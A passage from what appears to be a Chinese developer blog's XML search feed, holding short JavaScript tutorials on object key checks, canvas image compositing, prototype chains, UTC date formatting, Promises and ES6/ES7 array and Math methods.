    <content type="text"><![CDATA[判断某个object中是否存在某个key，此处不作value真实值判断，key存在即可。 12345678910var obj = &#123; a: &quot;Jack&quot;, b: &quot;Mark&quot;, methodA: function () &#123; &#125;, methodB: function () &#123; &#125;&#125; 直接取key（返回vlaue/undefined） 1234567if (obj &amp;&amp; obj.a) &#123; // 存在的处理&#125;if (obj &amp;&amp; obj.methodA) &#123; // 存在的处理&#125; []取值（返回value/undefined） 1234567if (obj &amp;&amp; obj["a"]) &#123; // 存在的处理&#125;if (obj &amp;&amp; obj["methodA"]) &#123; // 存在的处理&#125; in 关键字（返回true/false） 1234567if (obj &amp;&amp; "a" in obj) &#123; // 存在的处理&#125;if (obj &amp;&amp; "methodA" in obj) &#123; // 存在的处理&#125; hasOwnProperty判断属性是否存在（返回true/false） 1234567if (obj &amp;&amp; obj.hasOwnProperty("a")) &#123; // 存在的处理&#125;if (obj &amp;&amp; obj.hasOwnProperty("methodA")) &#123; // 存在的处理&#125; 注：方法1和方法2通过取值的方式不够稳妥，假如改key的真实取值就是undefined，那么便会出问题，方法3和方法4比较靠谱。]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[canvas将图片和文本合成图片]]></title>
    <url>%2Fblog%2Fjavascript%2Fcanvas%E5%90%88%E6%88%90%E5%9B%BE%E7%89%87%E5%92%8C%E6%96%87%E6%9C%AC.html</url>
    <content type="text"><![CDATA[需求为：将一张图片和用户输入的文字（居中显示，且超出指定宽度显示…）合成一张新的图片 12345&lt;canvas id="posterCanvas" width="240" height="180"&gt;&lt;/canvas&gt;&lt;hr&gt;用户输入的文本：&lt;input type="text" id="inputText"&gt;&lt;button id="convertBtn"&gt;合成图片&lt;/button&gt; 12345678910111213141516171819202122232425262728293031323334353637383940window.onload = function () &#123; var convertBtn = document.getElementById('convertBtn'); convertBtn.onclick = function () &#123; drawCanvasDefaultPoster(); &#125; function drawCanvasDefaultPoster() &#123; var inputText = document.getElementById('inputText'), posterCanvas = document.getElementById('posterCanvas'), posterContext = posterCanvas.getContext('2d'), posterCanvasWidth = posterCanvas.width, posterCanvasHeight = posterCanvas.height, posterDefaultImg = new Image(); posterDefaultImg.src = 'https://cdn-portrait.test.17zuoye.net//public/skin/teacher_coursewarev2/images/upload_example.png'; posterDefaultImg.onload = function () &#123; posterContext.drawImage(posterDefaultImg, 0, 0, posterCanvasWidth, posterCanvasHeight); // 填充图片 posterContext.font = '16px MicrosoftYaHei'; // 填充title posterContext.textAlign = 'center'; // posterContext.fillText(inputText.value, 120, 114); // 如不处理限制文本宽度，直接绘制即可 var wordWidth = 0; // 字符宽度 var inputValue = inputText.value; // 操作的title if (posterContext.measureText(inputValue).width &lt; 190) &#123; // title小于最大宽度，直接绘制 posterContext.fillText(inputValue, 120, 114); &#125; else &#123; // title大于最大宽度则需要截取绘制 for (var i = 0; i &lt; inputValue.length; i++) &#123; // 遍历，根据当前的文本长度是否大于指定宽度，来截取 wordWidth += posterContext.measureText(inputValue[i]).width; // 逐渐追加的文本宽度 if (wordWidth &gt; 190) &#123; // 指定（190 + '...'） posterContext.fillText(inputValue.substring(0, i) + '...', 120, 114); break; &#125; &#125; &#125; var base64Url = posterCanvas.toDataURL('image/jpeg', 1.0); // toBase64 // 此处取到base64就可以用了，如传给后端等 &#125; &#125;;&#125; // 如何限定宽度： https://blog.csdn.net/lishihong108/article/details/52483867?ref=myread]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js原型链]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%8E%9F%E5%9E%8B%E9%93%BE.html</url>
    <content type="text"><![CDATA[创建对象的几种方式 1、字面量法 1var o1 = &#123;name: 'o1'&#125;; 2、构造函数法（构造函数首字母大写） 12345678var o2 = new Object(&#123;name: 'o2'&#125;);var M = function (name) &#123; this.name = name; // return this // 默认有这一行&#125;;var o3 = new M('o3'); // 实例 3、Object.create()法 1var o4 = Object.create(&#123;name: 'o4'&#125;); 以上的运行结果如下： 我们看到o3和o4的运行结果有些不一样，o3前面的M表示构造函数，o4却不显示属性 但是运行o4.name发现其实是有值的，具体原因参考：leijee blog 构造函数扩展 var arr = [] 其实是 var a = new Array() 的语法糖； var obj = {} 其实是 var a = new Object() 的语法糖； function Foo(){} 其实是 var Foo = new Function(){}； 即 arr 的构造函数是 Array, obj 的构造函数是 Object，Foo 的构造函数是 Function。 原型规则 规则1：所有的引用类型（数组、对象、函数），都具有对象特性，可自有扩展属性（null 除外） 12345678var obj = &#123;&#125;;obj.a = 100; // &#123;a: 100&#125;var arr = [];arr.a = 100; // [a: 100]function fn()&#123;&#125;;fn.a = 100; 规则2：所有的引用类型（数组、对象、函数），都有一个 __proto__ (隐式原型) 属性，属性值是一个普通的对象 123console.log(obj.__proto__);console.log(arr.__proto__);console.log(fn.__proto__); 结果如下图： 规则3：所有的函数，都有一个 prototype (显示原型) 属性，属性值是一个普通的对象 1console.log(fn.prototype); // &#123;constructor: ƒ&#125; 规则4：所有的引用类型（数组、对象、函数），__proto__ (隐式属性) 属性值指向它的构造函数的 prototype (显示原型) 属性值 123console.log(obj.__proto__ === Object.prototype); // trueconsole.log(arr.__proto__ === Array.prototype); // trueconsole.log(fn.__proto__ === Function.prototype); // true 规则5：当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的 __proto__（即它的构造函数的 prototype）中去寻找，如果一层没有找到，就继续往上查找，一直到 Object.prototype 为止。因为 Object.prototype 等于 null 会自动停止。 1234567891011121314151617181920212223242526272829// 构造函数function Foo(name, age) &#123; this.name = name;&#125;// 扩展属性（规则1）Foo.prototype.alertName = function () &#123; alert(this.name);&#125;;// 创建一个实例fvar f = new Foo('zhangsan');// 扩展属性（规则1）f.printName = function () &#123; console.log(this.name);&#125;;// 测试f.printName();f.alertName(); // (规则5)// f本身没有 alertName 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性f.toString(); // (规则5)// f本身没有 toString 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性// 但是 Foo.prototype 中并没有找到这个属性，但是因为 Foo.prototype 本身也是一个对象，所以会继续向上寻找，Foo.prototype 的构造函数是 Object// 即去 f.__proto__.__proto__中查找，也即是 Object.prototype 中查找，最终发现了toStringf.__proto__ === Foo.prototype; // truef.__proto__.__proto__ === Object.prototype; // true 循环对象自身的属性对于上例，循环f自身的属性：12345678for (let item in f) &#123; if (f.hasOwnProperty(item)) &#123; console.log(item); &#125;&#125;// name// printName instanceof1234567f instanceof Foo; // f是否是Foo的一个实例// 判断逻辑是：// f的 __proto__ 一层一层往上，能否对应到 Foo.prototype，结果为true// 同理：f instanceof Object; // f是否是Object的一个实例，结果为true 构造函数、原型对象、实例、原型链关系网 关系网如下： 123456789101112131415var M = function (name) &#123; this.name = name;&#125;; // 构造函数var o3 = new M('o3'); // 实例o3var o4 = new M('o4'); // 实例o4// M: 是一个构造函数，任何普通函数在使用new运算符之后都变成构造函数// o3、o4: 实例// M.prototype: 原型对象// M.prototype.constructor: 原型对象的构造器，M.prototype.constructor === M// o3.__proto__: 实例的__prto__属性，o3.__proto__ === M.prototype// 实际上函数也有__proto__属性，M.__proto__ === Function.prototype，这个逻辑说明M构造函数是Function的一个实例 面试题：写一个原型链继承的demo12345678910111213141516171819202122232425262728293031323334353637// 父类function A() &#123; this.name = 'test name';&#125;A.prototype.getName = function() &#123; return this.name;&#125;// 子类Bfunction B() &#123; this.age = 12;&#125;// B继承AB.prototype = new A();B.prototype.getAge = function() &#123; return this.age;&#125;// 子类Cfunction C() &#123; this.sex = 'male';&#125;// C继承BC.prototype = new B();C.prototype.getSex = function() &#123; return this.sex;&#125;// 创建实例（abc是C的实例，C继承B，B继承A，所以abc可以调用A、B、C的方法）var abc = new C();console.log(abc.getSex()); // maleconsole.log(abc.getAge()); // 12console.log(abc.getName()); // test name 打印 console.dir(abc); 从图中我们可以看出，通过 prototype 扩展的属性会挂载在 __proto__ 属性下，通过 hasOwnProperty 方法可过滤扩展的属性12abc.hasOwnProperty('sex'); // trueabc.hasOwnProperty('getSex'); // false 我们可以打印一下隐式原型 __proto__ 和显式原型 prototype 的关系图 打印 console.log(abc.prototype)，输出为 undefined，我们可以知道，实例是没有 prototype 属性的 面试题：写一个实际应用中使用原型链的例子123456789101112131415161718192021222324252627282930313233343536373839// 实现类似jquery html()和on(event, fn)方法function Elem(id) &#123; this.elem = document.getElementById(id);&#125;// 扩展一个设置html内容的方法Elem.prototype.html = function(val) &#123; var elem = this.elem; if(val) &#123; elem.innerHTML = val; return this; // 链式操作 &#125; else &#123; return elem.innerHTML; &#125;&#125;// 扩张一个事件绑定的方法Elem.prototype.on = function(type, fn) &#123; var elem = this.elem; elem.addEventListener(type, fn); return this; // 链式操作&#125;var div1 = new Elem('div1');// console.log('div1');div1.html('&lt;p&gt;hello word&lt;/p&gt;'); // 设置html内容div1.on('click', function() &#123; // 绑定一个点击事件 alert('clicked');&#125;);// 我们在扩展html方法的时候写了一个 return this返回这个实例，就可以实现类似jquery链式操作的功能div1.html('&lt;p&gt;hello word&lt;/p&gt;').on('click', function() &#123; // 绑定一个点击事件 alert('clicked');&#125;);// 因为我们在每个扩展的方法里面都写了一个return this，所以链式操作的顺序可以调换// 甚至我们可以重复调用多次扩展的方法div1.html('&lt;p&gt;hello word&lt;/p&gt;').html('&lt;p&gt;Hello Word&lt;/p&gt;'); 面试题：描述 new 一个对象的过程123456function Foo(name, age) &#123; this.name = name; this.age = age; // return this;&#125;var f = new Foo('zhangsan', 18); 创建一个对象 this 指向这个新对象 执行代码，即对 this 赋值 返回 this，内部会有一句默认的 return this 本文参考：慕课网 原型链更多参考：JS原型链简单图解]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js转换UTC时间戳]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E8%BD%AC%E6%8D%A2UTC%E6%97%B6%E9%97%B4%E6%88%B3.html</url>
    <content type="text"><![CDATA[有时候前端会收到后端返回的时间格式是UTC时间戳格式的，但是他们又不愿意修改，将工作丢给前端，累觉不爱。 我们可以引入一个moment.js插件来快速处理时间格式，但是有时候我们不太方便去引入一个脚本，我们可以使用js来解析它： 转换成年月日12345678// UTC时间戳转换成年月日(2017-08-01)function resolveUTCDate (utcData) &#123; var myDate = new Date(utcData); var year = myDate.getYear(); var month = ('0' + (myDate.getMonth() + 1)).slice(-2); var day = ('0' + myDate.getDate()).slice(-2); return year + '-' + month + '-' + day;&#125; 转换成时分秒12345678// UTC时间戳转换成时分秒(08:08:08)function resolveUTCTime(utcTime) &#123; var myDate = new Date(utcTime); var hours = (&apos;0&apos; + myDate.getHours()).slice(-2); var minutes = (&apos;0&apos; + myDate.getMinutes()).slice(-2); var seconds = (&apos;0&apos; + myDate.getSeconds()).slice(-2); return hours + &apos;:&apos; + minutes + &apos;:&apos; + seconds;&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js执行机制]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6.html</url>
    <content type="text"><![CDATA[抛出问题，输出下列程序：1234567891011121314setTimeout(function()&#123; console.log(&apos;定时器开始啦&apos;)&#125;);new Promise(function(resolve)&#123; console.log(&apos;马上执行for循环啦&apos;); for(var i = 0; i &lt; 10000; i++)&#123; i == 99 &amp;&amp; resolve(); &#125;&#125;).then(function()&#123; console.log(&apos;执行then函数啦&apos;)&#125;);console.log(&apos;代码执行结束&apos;); 1234马上执行for循环啦代码执行结束执行then函数啦定时器开始啦 内部执行机制查看掘金 ssssyoki]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端开发devtools]]></title>
    <url>%2Fblog%2Fjavascript%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91devtools.html</url>
    <content type="text"><![CDATA[来源：eruda CDN:https://cdn.bootcss.com/eruda/1.2.6/eruda.min.js 用法：1234567891011121314151617181920212223&lt;script src="https://cdn.bootcss.com/eruda/1.2.6/eruda.min.js"&gt;&lt;/script&gt;&lt;script&gt; window.eruda.init(); // 自定义显示面板，默认全显示 // window.eruda.init(&#123; // tool: ['console', 'element'] // &#125;);&lt;/script&gt;&lt;script&gt; // test console.log('11111'); var obj = &#123; a: '1', b: '2', c: '3' &#125;; console.log(obj); console.dir(obj); window.localStorage.setItem('a', '123');&lt;/script&gt; DEMO: 非常感谢liriliri提供的eruda工具，非常赞 相同功能的工具：Tencent vConsole]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES7 includes方法]]></title>
    <url>%2Fblog%2Fes7%2Fes7-includes%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[ES7只新增了2个新特性 Array.prototype.includes Exponentiation Operator(求幂运算) 本文只讲解includes方法，Exponentiation Operator(求幂运算)请移步ES7求幂运算 Array.prototype.includes用法都容易和简单。它是一个替代indexOf（ES6新增），开发人员用来检查数组中是否存在值，indexOf是一种尴尬的使用，因为它返回一个元素在数组中的位置或者-1当这样的元素不能被找到的情况下。所以它返回一个数字，而不是一个布尔值。 1234567891011let arr = ['react', 'angular', 'vue']// WRONGif (arr.indexOf('react')) &#123; // 0 -&gt; evaluates to false, definitely as we expected console.log('Can use React') // this line would never be executed&#125;// Correctif (arr.indexOf('react') !== -1) &#123; console.log('Can use React')&#125; 或者使用一点点hack 位运算符 ~ 使代码更加紧凑一些，因为~（位异或）对任何数字相当于-(a + 1): 123456let arr = ['react', 'angular', 'vue']// Correctif (~arr.indexOf('react')) &#123; console.log('Can use React')&#125; 而在ES7中，可以使用includes开替代indexOf作为检测： 123456let arr = ['react', 'angular', 'vue']// Correctif (arr.includes('react')) &#123; console.log('Can use React')&#125; 开发者还能在字符串中使用includes:123456let str = 'React Quickly'// Correctif (str.toLowerCase().includes('react')) &#123; // true console.log('Found "react"') &#125; includes第二可选参数fromIndex，这对于优化是有好处的，因为它允许从特定位置开始寻找匹配。 12345678console.log([1, 2, 3].includes(2)) // === trueconsole.log([1, 2, 3].includes(4)) // === falseconsole.log([1, 2, NaN].includes(NaN)) // === trueconsole.log([1, 2, -0].includes(+0)) // === trueconsole.log([1, 2, +0].includes(-0)) // === trueconsole.log(['a', 'b', 'c'].includes('a')) // === trueconsole.log(['a', 'b', 'c'].includes('a', 1)) // === falseconsole.log('React Quickly'.includes('React')) // === true]]></content>
      <tags>
        <tag>ES7</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES7 求幂运算]]></title>
    <url>%2Fblog%2Fes7%2Fes7-%E6%B1%82%E5%B9%82%E8%BF%90%E7%AE%97.html</url>
    <content type="text"><![CDATA[ES7只新增了2个新特性 Array.prototype.includes Exponentiation Operator(求幂运算) 本文只讲解ES7求幂运算，includes方法请移步ES7 includes 在ES6中，可以使用Math.pow来实现求幂运算12Math.pow(2, 3); // 8Math.pow(3, 2); // 9 ES7中，可以使用**来实习求幂运算122 ** 3 // 83 ** 2 // 9]]></content>
      <tags>
        <tag>ES7</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Promise对象]]></title>
    <url>%2Fblog%2Fes6%2Fes6-Promise%E5%AF%B9%E8%B1%A1.html</url>
    <content type="text"><![CDATA[摘自：阮一峰 ECMAScript 6 入门 介绍Promise是异步编程的一种解决方案 所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，它是一个对象，从它可以获取异步操作的消息。 对象的状态不受外界影响，Promise对象代表这一个异步操作，有三个状态：如下，只有异步操作的结果才可以决定当前是哪一种状态 Pending（进行中） Resolved（已完成，又称Fulled） Rejected（已失败） 一旦状态改变，就不会再变，任何时候都可以得到这个结果，Promised对象的状态改变，只有两种，如下：，只要这两种情况发生，状态就凝固了，不会再变了。会一直保持这个结果。 从Pending变为Resolved 从Pending变为Rejected 基本用法 Promise对象是一个构造函数，用来生成Promise对象 1234567var promise = new Promise(function(resolve, reject) &#123; if (/* 异步操作成功时 */) &#123; resolve(value) &#125; else &#123; reject(error) &#125;&#125;) resolve函数的作用是，将Promise对象的状态从“未完成”变为“成功”（从Pending变为Resolved），在异步操作成功的时候调用，并将异步操作的结果，作为参数传递出去；reject函数的作用是，将Promise对象的状态从“未完成”变为“失败”（从Pending变为Rejected），在异步操作失败的时候调用，并将异步操作返回的错误，作为参数传递出去。 Promise实例生成之后，可以用then方法指定Resolved和Reject状态的回调函数，两个参数，一个成功回调，一个失败回调，第二个参数失败回调可选 12345promise.then(function (value) &#123; // success&#125;, function (error) &#123; // error&#125;) 例如下例： 123456789function timeout(ms) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(resolve, ms, 'done'); &#125;);&#125;timeout(100).then((value) =&gt; &#123; console.log(value);&#125;); 上例中：timeout方法返回一个Promise实例，表示一段时间以后才会发生的结果。过了指定的时间（ms参数）以后，Promise实例的状态变为Resolved，就会触发then方法绑定的回调函数。 Promise新建后就会立即执行 例如下例： 1234567891011121314let promise = new Promise(function(resolve, reject) &#123; console.log('Promise'); resolve();&#125;);promise.then(function() &#123; console.log('Resolved.');&#125;);console.log('Hi!');// Promise// Hi!// Resolved 上例中：Promise实例新建后立即执行，先输出“Promise”，然后then方法指定回调，当时回调会在当前脚本的同步方法之后才会执行，所以其次是输出“Hi！”，最后才会输出回调里面的“Resolved” 下面是异步加载图片的例子： 123456789101112131415function loadImageAsync(url) &#123; return new Promise(function(resolve, reject) &#123; var image = new Image(); image.onload = function() &#123; resolve(image); &#125;; image.onerror = function() &#123; reject(new Error('Could not load image at ' + url)); &#125;; image.src = url; &#125;);&#125; 下面是用Promise对象实现Ajax操作的例子 1234567891011121314151617181920212223242526272829var getJSON = function(url) &#123; var promise = new Promise(function(resolve, reject)&#123; var client = new XMLHttpRequest(); client.open("GET", url); client.onreadystatechange = handler; client.responseType = "json"; client.setRequestHeader("Accept", "application/json"); client.send(); function handler() &#123; if (this.readyState !== 4) &#123; return; &#125; if (this.status === 200) &#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125;; &#125;); return promise;&#125;;getJSON("/posts.json").then(function(json) &#123; console.log('Contents: ' + json);&#125;, function(error) &#123; console.error('出错了', error);&#125;); resolve函数参数除了可能是正常的值以外也可能是另一个Promise实例，即回调里面是请求，如下例： 12345678var p1 = new Promise(function (resolve, reject) &#123; // ...&#125;);var p2 = new Promise(function (resolve, reject) &#123; // ... resolve(p1);&#125;) 上例中：p1和p2都是Promise的实例，但是p2的resolve方法将p1作为参数，即p1的状态决定了p2的状态。如果p1是Pending，那么p2就必须要等待。如果p1是Resolved或Rejected，那么p2的回调函数将会立即执行。 123456789101112var p1 = new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error('fail')), 3000)&#125;)var p2 = new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; resolve(p1), 1000)&#125;)p2 .then(result =&gt; console.log(result)) .catch(error =&gt; console.log(error))// Error: fail 上面代码中：p1是一个Promise，3s后变为rejected。p2的状态在1s之后改变，resolve方法返回的是p1。此时，由于p2返回的是另一个Promise，所以后面的then语句都变成针对后者（p1）。又过了2s，p1变为rejected，导致出发catch方法指定的回调函数。 Promise.prototype.then()then方法是定义在原型对象Promise.prototype上的。它的作用是为Promise实例添加状态改变时的回调。前面说过，then方法的第一个参数是Resolved成功后的回调，第二个参数（可选）是Rejected失败后的回调。 then方法返回的是一个新的Promise实例，因此可以采用链式写法，及then方法后再调用一个then方法 12345getJSON("/posts.json").then(function(json) &#123; return json.post;&#125;).then(function(post) &#123; // ...&#125;); 上面的代码中，使用then方法一次指定了两个回调，第一个回调完成以后，会将返回的结果作为参数，传入第二个回调。 这种链式的then可以指定一组按照次序调用的回调。这时，前一个回调有可能还是一个Promise实例，这时后一个就必须等待。如下例： 1234567getJSON("/post/1.json").then(function(post) &#123; return getJSON(post.commentURL);&#125;).then(function funcA(comments) &#123; console.log("Resolved: ", comments);&#125;, function funcB(err)&#123; console.log("Rejected: ", err);&#125;); 上例中：第一个then方法指定的回调是一个Promise实例。这时，第二个then方法指定的回调，就会等待这个新的Promise对象状态先发生变化。如果变为Resolved，就调用funcA，如果变为Rejected，就调用funcB。 采用箭头函数： 123456getJSON("/post/1.json").then( post =&gt; getJSON(post.commentURL)).then( comments =&gt; console.log("Resolved: ", comments), err =&gt; console.log("Rejected: ", err)); Promise.prototype.catch()Promise.ptototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数。 123456getJSON('/posts.json').then(function(posts) &#123; // ...&#125;).catch(function(error) &#123; // 处理 getJSON 和 前一个回调函数运行时发生的错误 console.log('发生错误！', error);&#125;); 上例中：如果该对象状态变为Resolved，会调用then方法指定的回调，如果异步操作抛出错误，状态就会变为Rejected，就会调用catch方法指定的回调。另外，如果运行中抛出错误，也会被catch捕获。 123456p.then((val) =&gt; console.log('fulfilled:', val)) .catch((err) =&gt; console.log('rejected', err));// 等同于p.then((val) =&gt; console.log('fulfilled:', val)) .then(null, (err) =&gt; console.log("rejected:", err)); 如下例： 1234567var promise = new Promise(function(resolve, reject) &#123; throw new Error('test');&#125;);promise.catch(function(error) &#123; console.log(error);&#125;);// Error: test promise抛出一个错误，就会被catch方法指定的回调函数捕获。注意，上面的写法与下面两种写法是等价的。 12345678910111213141516171819// 写法一var promise = new Promise(function(resolve, reject) &#123; try &#123; throw new Error('test'); &#125; catch(e) &#123; reject(e); &#125;&#125;);promise.catch(function(error) &#123; console.log(error);&#125;);// 写法二var promise = new Promise(function(resolve, reject) &#123; reject(new Error('test'));&#125;);promise.catch(function(error) &#123; console.log(error);&#125;); 上述也说明，reject方法的作用，等同于抛出错误。 如果Promise状态已经变成Resolved，再抛出错误是无效的。 12345678var promise = new Promise(function(resolve, reject) &#123; resolve('ok'); throw new Error('test');&#125;);promise .then(function(value) &#123; console.log(value) &#125;) .catch(function(error) &#123; console.log(error) &#125;);// ok 上面代码中：Promise在resolve语句后面，再抛出错误，不会被捕获，等同于没有抛出。因为Promise的状态一旦改变，就永久保持该状态，不会再改变了。 一般来说，不要在then方法里面定义Rejected失败状态的回调，应该使用catch语句 12345678910111213141516// badpromise .then(function(data) &#123; // success &#125;, function(err) &#123; // error &#125;);// goodpromise .then(function(data) &#123; //cb // success &#125;) .catch(function(err) &#123; // error &#125;); 因为，Promise对象的错误具有冒泡性质，会一直向后传递，直到被捕获。错误总可以被catch语句捕获。 then catch语句更容易捕获错误，而且接近同步的写法（try/catch）语句。 Promise.all()Promise.all方法用于将多个Promise实例，包装成一个新的Promise实例。 1var p = Promise.all([p1, p2, p3]); Promise.all的参数可以不是数组，但必须具有接口，且返回的每个成员都是Promise实例 p的状态有p1、p2、p3决定，分成两种情况 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled。此时p1、p2、p3的返回值组成一个数组，传递给p的回调 只要p1、p2、p3的状态有一个被rejected，p的状态就会变成rejected，此时，第一个被rejected的实例的返回值，会传递给p的回调 Promise.race()Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。 1var p = Promise.race([p1, p2, p3]); Promise.resolve()有时需要将现有对象转为Promise对象，Promise.resolve方法就起到这个作用 1var jsPromise = Promise.resolve($.ajax('/whatever.json')); Promise.resolve等价于下面的写法 123Promise.resolve('foo')// 等价于new Promise(resolve =&gt; resolve('foo')) Promise.reject()Promise.reject方法也会返回一个新的Promise实例，状态未rejected 12345678var p = Promise.reject('出错了');// 等同于var p = new Promise((resolve, reject) =&gt; reject('出错了'))p.then(null, function (s) &#123; console.log(s)&#125;);// 出错了 应用将图片的加载写成一个Promise，一旦加载完成，Promise的状态就发生变化。 12345678const preloadImage = function (path) &#123; return new Promise(function (resolve, reject) &#123; var image = new Image(); image.onload = resolve; image.onerror = reject; image.src = path; &#125;);&#125;;]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6 array方法]]></title>
    <url>%2Fblog%2Fes6%2Fes6-array%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[参考：阮一峰 ES6 Array方法 Array.from()：将两类对象（类似数组的对象和可遍历的对象）转为真正的数组 123456789101112let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法：var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法：let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] Array.of()：将一组值转换成数组 123456789Array.of(3, 11, 8) // [3,11,8]Array.of(3) // [3]Array.of(3).length // 1Array.of() // []Array.of(undefined) // [undefined] copyWithin()：将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组 Array.prototype.copyWithin(target, start = 0, end = this.length) target（必需）：从该位置开始替换数据。 start（可选）：从该位置开始读取数据，默认为0。如果为负值，表示倒数。 end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示倒数。正从0开始，负从-1开始。 这三个参数都应该是数值，如果不是，会自动转为数值。 1234567891011121314151617181920[1, 2, 3, 4, 5].copyWithin(0, 3) // [4, 5, 3, 4, 5]// 从3号位直到数组结束的成员（4和5），复制到从0号位开始的位置，结果覆盖了原来的1和2[1, 2, 3, 4, 5].copyWithin(0, 3, 4) // [4, 2, 3, 4, 5]// 将3号位复制到0号位[1, 2, 3, 4, 5].copyWithin(0, -2, -1) // [4, 2, 3, 4, 5]// -2相当于3号位，-1相当于4号位[].copyWithin.call(&#123;length: 5, 3: 1&#125;, 0, 3) // &#123;0: 1, 3: 1, length: 5&#125;// 将3号位复制到0号位var i32a = new Int32Array([1, 2, 3, 4, 5]); i32a.copyWithin(0, 2); // Int32Array [3, 4, 5, 4, 5]// 将2号位到数组结束，复制到0号位// 对于没有部署TypedArray的copyWithin方法的平台// 需要采用下面的写法:[].copyWithin.call(new Int32Array([1, 2, 3, 4, 5]), 0, 3, 4); // Int32Array [4, 2, 3, 4, 5] find()：用于找出第一个符合条件的数组成员 1234567[1, 4, -5, 10, -1].find((n) =&gt; n &lt; 0) // -5// 找出数组中第一个小于0的成员，-1布什第一个，不返回。[1, 5, 10, 15].find(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 10// 找出大于9的，15不是第一个，不返回 findIndex()：返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1 1234567[1, 5, 10, 15].findIndex(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 2[NaN].indexOf(NaN) // -1[NaN].findIndex(y =&gt; Object.is(NaN, y)) // 0 fill()：使用给定值，填充一个数组 第二个参数（可选）表示替换起始位置，第三个参数（可选），表示结束位置 12345['a', 'b', 'c'].fill(7) // [7, 7, 7]new Array(3).fill(7) // [7, 7, 7]['a', 'b', 'c'].fill(7, 1, 2) // ['a', 7, 'c'] includes()：是否包含指定元素，es7语法，babel转换器已支持 第二个参数可选，表示指定搜索起始位置，从起始位置到结尾，默认为0，负数表示倒数；当大于数组长度，会重置为从0开始 12345678910111213141516171819202122232425262728[1, 2, 3].includes(2); // true[1, 2, 3].includes(4); // false[1, 2, NaN].includes(NaN); // true[1, 2, 3].includes(3, 3); // false[1, 2, 3].includes(3, -1); // true[1, 2, 3].includes(2, 0); // true[1, 2, 3].includes(2, 1); // true[1, 2, 3].includes(2, 2); // false[1, 2, 3].includes(2, 3); // false[1, 2, 3].includes(2, -1); // false[1, 2, 3].includes(2, -2); // true[1, 2, 3].includes(2, -3); // true[1, 2, 3].includes(2, -4); // true]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6 math方法]]></title>
    <url>%2Fblog%2Fes6%2Fes6-math%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[参考：阮一峰 ES6 Math对象扩展 Math.trunc()：用于去除一个数的小数部分，返回整数部分 1234567891011121314151617Math.trunc(4.1) // 4Math.trunc(4.9) // 4Math.trunc(-4.1) // -4Math.trunc(-4.9) // -4Math.trunc(-0.1234) // -0Math.trunc('123.456') // 123，数值字符串会先经过Number()方法转换成数值Math.trunc(NaN); // NaNMath.trunc('foo'); // NaNMath.trunc(); // NaN Math.sign()：判断一个输是正数、负数还是零 参数为正数，返回+1； 参数为负数，返回-1； 参数为0，返回0； 参数为-0，返回-0; 其他值，返回NaN 12345678910111213Math.sign(-5) // -1Math.sign(5) // +1Math.sign(0) // +0Math.sign(-0) // -0Math.sign(NaN) // NaNMath.sign('foo'); // NaNMath.sign(); // NaN Math.cbrt()：计算一个数的立方根 1234567891011Math.cbrt(-1) // -1Math.cbrt(0) // 0Math.cbrt(1) // 1Math.cbrt(2) // 1.2599210498948734 Math.cbrt('8') // 2，数值字符串会先经过Number转换Math.cbrt('hello') // NaN]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[let 和 const]]></title>
    <url>%2Fblog%2Fes6%2Fes6-let%E5%92%8Cconst%E7%94%A8%E6%B3%95.html</url>
